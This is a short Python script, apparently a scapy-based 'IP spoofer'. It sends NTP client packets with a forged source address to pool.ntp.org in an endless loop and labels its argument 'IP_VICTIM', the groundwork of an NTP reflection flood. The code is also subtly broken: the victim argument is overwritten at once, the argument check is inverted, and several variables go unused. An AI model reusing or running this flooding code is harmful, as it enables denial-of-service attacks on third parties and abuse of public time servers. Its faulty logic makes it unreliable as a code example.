import socket
import struct
import datetime
from scapy.all import *
import threading
import os
import sys
import socket


if len(sys.argv) > 2:
    print("Usage python3 ntpclient.py 'IP_VICTIM'")
    exit()

# IP SPOOFER
A = "127.0.0.1" # spoofed source IP address

if (len(sys.argv) == 2):
    B = sys.argv[1] # "pool.ntp.org" # destination IP address
B = "pool.ntp.org"
C = RandShort() # source port
D = 80 # destination port
payload = ("\x1b\x00\x00\x00"+"\x00"*11*4) # packet NTP payload 

while True:
    spoofed_packet = IP(src=A, dst=B) / UDP(dport=123,sport=50000) / payload
    #sniff(prn=lambda x:x.summary(), count=5)
    send(spoofed_packet)
# rep,non_rep = sr(spoofed_packet)



